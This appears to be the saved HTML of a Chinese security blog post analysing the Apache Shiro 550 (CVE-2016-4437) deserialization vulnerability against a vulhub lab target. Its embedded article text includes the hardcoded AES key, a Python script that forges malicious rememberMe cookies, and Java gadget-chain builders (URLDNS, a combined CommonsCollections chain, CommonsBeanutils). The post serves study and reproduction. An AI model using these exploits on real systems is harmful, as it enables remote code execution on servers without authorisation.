<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>shiro550反序列化漏洞 | w8nn9z Blog</title>
<meta name="keywords" content="">
<meta name="description" content="shiro550反序列化漏洞 - w8nn9z Blog">
<meta name="author" content="">
<link rel="canonical" href="https://z9nn8w.github.io/posts/web/shiro550/">

<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/web/shiro550/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/web/shiro550/">
  <meta property="og:site_name" content="w8nn9z Blog">
  <meta property="og:title" content="shiro550反序列化漏洞">
  <meta property="og:locale" content="zh-cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-09-27T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-09-27T00:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="shiro550反序列化漏洞">
<meta name="twitter:description" content="">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://z9nn8w.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "WEB",
      "item": "https://z9nn8w.github.io/posts/web/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "shiro550反序列化漏洞",
      "item": "https://z9nn8w.github.io/posts/web/shiro550/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "shiro550反序列化漏洞",
  "name": "shiro550反序列化漏洞",
  "description": "",
  "keywords": [
    
  ],
  "articleBody": "漏洞复现环境：\ngit clone https://github.com/apache/shiro.git\rcd shiro\rgit checkout shiro-root-1.2.4\rTomcat: 9.0.109\rjdk: 1.8.0_u65 漏洞靶场环境：\nhttps://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437\rdocker compose up -d 漏洞分析 shiro550反序列化漏洞使用了固定key进行AES加解密，特征是请求响应中包含字段rememberMe，先查找对应方法，CookieRemembermeManager类中的getRememberedSerializedIdentity方法：\nprotected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { if (!WebUtils.isHttp(subjectContext)) { if (log.isDebugEnabled()) { String msg = \"SubjectContext argument is not an HTTP-aware instance. This is required to obtain a \" + \"servlet request and response in order to retrieve the rememberMe cookie. Returning \" + \"immediately and ignoring rememberMe operation.\"; log.debug(msg); } return null; } WebSubjectContext wsc = (WebSubjectContext) subjectContext; if (isIdentityRemoved(wsc)) { return null; } HttpServletRequest request = WebUtils.getHttpRequest(wsc); HttpServletResponse response = WebUtils.getHttpResponse(wsc); String base64 = getCookie().readValue(request, response); // Browsers do not always remove cookies immediately (SHIRO-183) // ignore cookies that are scheduled for removal if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null; if (base64 != null) { base64 = ensurePadding(base64); if (log.isTraceEnabled()) { log.trace(\"Acquired Base64 encoded identity [\" + base64 + \"]\"); } byte[] decoded = Base64.decode(base64); if (log.isTraceEnabled()) { log.trace(\"Base64 decoded byte array length: \" + (decoded != null ? decoded.length : 0) + \" bytes.\"); } return decoded; } else { //no cookie set - new site visitor? return null; } } 查找调用getRememberedSerializedIdentity的方法，AbstractRemembermeManager类中的getRememberedPrincipals方法：\npublic PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) { PrincipalCollection principals = null; try { byte[] bytes = getRememberedSerializedIdentity(subjectContext); //SHIRO-138 - only call convertBytesToPrincipals if bytes exist: if (bytes != null \u0026\u0026 bytes.length \u003e 0) { principals = convertBytesToPrincipals(bytes, subjectContext); } } catch (RuntimeException re) { principals = onRememberedPrincipalFailure(re, subjectContext); } return principals; } 跟进convertBytesToPrincipals方法：\nprotected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) { if (getCipherService() != null) { bytes = decrypt(bytes); } return deserialize(bytes); } 跟进decrypt方法：\nprotected byte[] decrypt(byte[] encrypted) { byte[] serialized = encrypted; CipherService cipherService = getCipherService(); if (cipherService != null) { ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey()); serialized = byteSource.getBytes(); } return serialized; } 一直跟进+Find Usages找到加解密方式以及硬编码的key：\npublic byte[] getDecryptionCipherKey() { return decryptionCipherKey; } public void setDecryptionCipherKey(byte[] decryptionCipherKey) { this.decryptionCipherKey = decryptionCipherKey; } public void setCipherKey(byte[] cipherKey) { //Since this method should only be used in symmetric ciphers //(where the enc and dec keys are the same), set it on both: setEncryptionCipherKey(cipherKey); setDecryptionCipherKey(cipherKey); } public AbstractRememberMeManager() { this.serializer = new DefaultSerializer\u003cPrincipalCollection\u003e(); this.cipherService = new AesCipherService(); setCipherKey(DEFAULT_CIPHER_KEY_BYTES); } public DefaultBlockCipherService(String algorithmName) { super(algorithmName); this.modeName = OperationMode.CBC.name(); this.paddingSchemeName = PaddingScheme.PKCS5.getTransformationName(); this.blockSize = DEFAULT_BLOCK_SIZE; //0 = use the JCA provider's default this.streamingModeName = OperationMode.CBC.name(); this.streamingPaddingSchemeName = PaddingScheme.PKCS5.getTransformationName(); this.streamingBlockSize = DEFAULT_STREAMING_BLOCK_SIZE; } public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException { byte[] encrypted = ciphertext; //No IV, check if we need to read the IV from the stream: byte[] iv = null; if (isGenerateInitializationVectors(false)) { try { //We are generating IVs, so the ciphertext argument array is not actually 100% cipher text. Instead, it //is: // - the first N bytes is the initialization vector, where N equals the value of the // 'initializationVectorSize' attribute. // - the remaining bytes in the method argument (arg.length - N) is the real cipher text. //So we need to chunk the method argument into its constituent parts to find the IV and then use //the IV to decrypt the real ciphertext: int ivSize = getInitializationVectorSize(); int ivByteSize = ivSize / BITS_PER_BYTE; //now we know how large the iv is, so extract the iv bytes: iv = new byte[ivByteSize]; System.arraycopy(ciphertext, 0, iv, 0, ivByteSize); //remaining data is the actual encrypted ciphertext. Isolate it: int encryptedSize = ciphertext.length - ivByteSize; encrypted = new byte[encryptedSize]; System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize); } catch (Exception e) { String msg = \"Unable to correctly extract the Initialization Vector or ciphertext.\"; throw new CryptoException(msg, e); } } return decrypt(encrypted, key, iv); } private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); 可以分析出解密过程：base64decode -\u003e AESdecode -\u003e deserialize，key为base64编码的kPH+bIxk5D2deZiIxcaaaA==，iv是密文开头内容所以不用设置，填充方式为PKCS5，生成恶意Cookie的exp：\nimport base64 import uuid from Crypto.Cipher import AES with open(\"ser.bin\", \"rb\") as f: data = f.read() BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() # PKCS5 key = \"kPH+bIxk5D2deZiIxcaaaA==\" mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data))) print(ciphertext) URLDNS URLDNS所需依赖都是java内置类，URLDNS.java：\nimport java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.util.HashMap; public class URLDNS { public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static void main(String[] args) throws Exception { HashMap\u003cURL, Integer\u003e hashmap = new HashMap\u003cURL, Integer\u003e(); URL url = new URL(\"http://d0otgz.dnslog.cn\"); Field hashcode = url.getClass().getDeclaredField(\"hashCode\"); hashcode.setAccessible(true); hashcode.set(url, 114514); hashmap.put(url, 1); hashcode.set(url, -1); serialize(hashmap); } } CC 由于shiro中不能加载数组类，所以需要拼接CC3,CC2,CC6：\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.Map; import java.util.PriorityQueue; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import org.apache.commons.beanutils.BeanComparator; import org.apache.commons.beanutils.PropertyUtils; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; public class CC { public static void main(String[] args) throws Exception { // CC3 TemplatesImpl templatesImpl = new TemplatesImpl(); Field _nameField = templatesImpl.getClass().getDeclaredField(\"_name\"); _nameField.setAccessible(true); _nameField.set(templatesImpl, \"sxc\"); Field _bytecodesField = templatesImpl.getClass().getDeclaredField(\"_bytecodes\"); _bytecodesField.setAccessible(true); byte[] bytecode = Files.readAllBytes(Paths.get(\"path\\\\to\\\\Calc.class\")); byte[][] bytecodes = {bytecode}; _bytecodesField.set(templatesImpl, bytecodes); // CC2 InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\", null, null); // CC6 HashMap\u003cObject, Object\u003e hashmap = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e lazymap = LazyMap.decorate(hashmap, (new ConstantTransformer(\"1\"))); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, templatesImpl); HashMap\u003cObject, Object\u003e hm = new HashMap\u003c\u003e(); hm.put(tiedMapEntry, \"258\"); lazymap.remove(templatesImpl); Class clazz = LazyMap.class; Field factoryField = clazz.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(lazymap, invokerTransformer); serialize(hm); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws IOException, ClassNotFoundException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } CB CB链：PriorityQueue.readObject -\u003e BeanComparator.compare -\u003e PropertyUtils.getProperty(TemplatesImpl, \"outputProperties\") -\u003e TemplatesImpl.getOutputProperties -\u003e defineTransletClasses.defineClass -\u003e getTransletInstance中调用newInstance()\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import java.util.PriorityQueue; import org.apache.commons.beanutils.BeanComparator; import org.apache.commons.beanutils.PropertyUtils; public class CB { public static void main(String[] args) throws Exception { TemplatesImpl templatesImpl = new TemplatesImpl(); Field _nameField = templatesImpl.getClass().getDeclaredField(\"_name\"); _nameField.setAccessible(true); _nameField.set(templatesImpl, \"sxc\"); Field _bytecodesField = templatesImpl.getClass().getDeclaredField(\"_bytecodes\"); _bytecodesField.setAccessible(true); byte[] bytecode = Files.readAllBytes(Paths.get(\"path\\\\to\\\\Calc.class\")); byte[][] bytecodes = {bytecode}; _bytecodesField.set(templatesImpl, bytecodes); // PropertyUtils.getProperty(templatesImpl, \"outputProperties\"); BeanComparator beanComparator = new BeanComparator(\"outputProperties\", new AttrCompare()); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(templatesImpl); priorityQueue.add(2); Field comparatorField = priorityQueue.getClass().getDeclaredField(\"comparator\"); comparatorField.setAccessible(true); comparatorField.set(priorityQueue, beanComparator); serialize(priorityQueue); } public static void serialize(Object obj) throws IOException, ClassNotFoundException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } } 参考资料：\nhttps://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437\nhttps://arrnitage.github.io/Shiro-550/\nhttps://www.bilibili.com/video/BV1dq4y1B76x\n",
  "wordCount" : "1576",
  "inLanguage": "en",
  "datePublished": "2025-09-27T00:00:00Z",
  "dateModified": "2025-09-27T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://z9nn8w.github.io/posts/web/shiro550/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "w8nn9z Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://z9nn8w.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/posts" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/archives" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/about" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      shiro550反序列化漏洞
    </h1>
    <div class="post-meta"><span title='2025-09-27 00:00:00 +0000 UTC'>September 27, 2025</span>

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details >
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" aria-label="漏洞分析">漏洞分析</a></li>
                    <li>
                        <a href="#urldns" aria-label="URLDNS">URLDNS</a></li>
                    <li>
                        <a href="#cc" aria-label="CC">CC</a></li>
                    <li>
                        <a href="#cb" aria-label="CB">CB</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><p>漏洞复现环境：</p>
<pre tabindex="0"><code>git clone https://github.com/apache/shiro.git
cd shiro
git checkout shiro-root-1.2.4

Tomcat: 9.0.109
jdk: 1.8.0_u65
</code></pre><p>漏洞靶场环境：</p>
<pre tabindex="0"><code>https://github.com/vulhub/vulhub/tree/master/shiro/CVE-2016-4437
docker compose up -d
</code></pre><h2 id="漏洞分析">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析">#</a></h2>
<p>shiro550反序列化漏洞使用了固定key进行AES加解密，特征是请求响应中包含字段<code>rememberMe</code>，先查找对应方法，<code>CookieRemembermeManager</code>类中的<code>getRememberedSerializedIdentity</code>方法：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">getRememberedSerializedIdentity</span>(SubjectContext subjectContext) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>WebUtils.<span style="color:#a6e22e">isHttp</span>(subjectContext)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (log.<span style="color:#a6e22e">isDebugEnabled</span>()) {
</span></span><span style="display:flex;"><span>                String msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &#34;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;servlet request and response in order to retrieve the rememberMe cookie. Returning &#34;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;immediately and ignoring rememberMe operation.&#34;</span>;
</span></span><span style="display:flex;"><span>                log.<span style="color:#a6e22e">debug</span>(msg);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        WebSubjectContext wsc <span style="color:#f92672">=</span> (WebSubjectContext) subjectContext;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (isIdentityRemoved(wsc)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        HttpServletRequest request <span style="color:#f92672">=</span> WebUtils.<span style="color:#a6e22e">getHttpRequest</span>(wsc);
</span></span><span style="display:flex;"><span>        HttpServletResponse response <span style="color:#f92672">=</span> WebUtils.<span style="color:#a6e22e">getHttpResponse</span>(wsc);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        String base64 <span style="color:#f92672">=</span> getCookie().<span style="color:#a6e22e">readValue</span>(request, response);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Browsers do not always remove cookies immediately (SHIRO-183)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ignore cookies that are scheduled for removal</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (Cookie.<span style="color:#a6e22e">DELETED_COOKIE_VALUE</span>.<span style="color:#a6e22e">equals</span>(base64)) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (base64 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>            base64 <span style="color:#f92672">=</span> ensurePadding(base64);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (log.<span style="color:#a6e22e">isTraceEnabled</span>()) {
</span></span><span style="display:flex;"><span>                log.<span style="color:#a6e22e">trace</span>(<span style="color:#e6db74">&#34;Acquired Base64 encoded identity [&#34;</span> <span style="color:#f92672">+</span> base64 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;]&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> decoded <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">decode</span>(base64);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (log.<span style="color:#a6e22e">isTraceEnabled</span>()) {
</span></span><span style="display:flex;"><span>                log.<span style="color:#a6e22e">trace</span>(<span style="color:#e6db74">&#34;Base64 decoded byte array length: &#34;</span> <span style="color:#f92672">+</span> (decoded <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> decoded.<span style="color:#a6e22e">length</span> : 0) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; bytes.&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> decoded;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//no cookie set - new site visitor?</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>查找调用<code>getRememberedSerializedIdentity</code>的方法，<code>AbstractRemembermeManager</code>类中的<code>getRememberedPrincipals</code>方法：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> PrincipalCollection <span style="color:#a6e22e">getRememberedPrincipals</span>(SubjectContext subjectContext) {
</span></span><span style="display:flex;"><span>        PrincipalCollection principals <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> getRememberedSerializedIdentity(subjectContext);
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (bytes <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> bytes.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> 0) {
</span></span><span style="display:flex;"><span>                principals <span style="color:#f92672">=</span> convertBytesToPrincipals(bytes, subjectContext);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (RuntimeException re) {
</span></span><span style="display:flex;"><span>            principals <span style="color:#f92672">=</span> onRememberedPrincipalFailure(re, subjectContext);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> principals;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>跟进<code>convertBytesToPrincipals</code>方法：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> PrincipalCollection <span style="color:#a6e22e">convertBytesToPrincipals</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes, SubjectContext subjectContext) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (getCipherService() <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>            bytes <span style="color:#f92672">=</span> decrypt(bytes);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> deserialize(bytes);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>跟进<code>decrypt</code>方法：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">decrypt</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> encrypted) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> serialized <span style="color:#f92672">=</span> encrypted;
</span></span><span style="display:flex;"><span>        CipherService cipherService <span style="color:#f92672">=</span> getCipherService();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (cipherService <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>            ByteSource byteSource <span style="color:#f92672">=</span> cipherService.<span style="color:#a6e22e">decrypt</span>(encrypted, getDecryptionCipherKey());
</span></span><span style="display:flex;"><span>            serialized <span style="color:#f92672">=</span> byteSource.<span style="color:#a6e22e">getBytes</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> serialized;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>一直跟进+<code>Find Usages</code>找到加解密方式以及硬编码的key：</p>
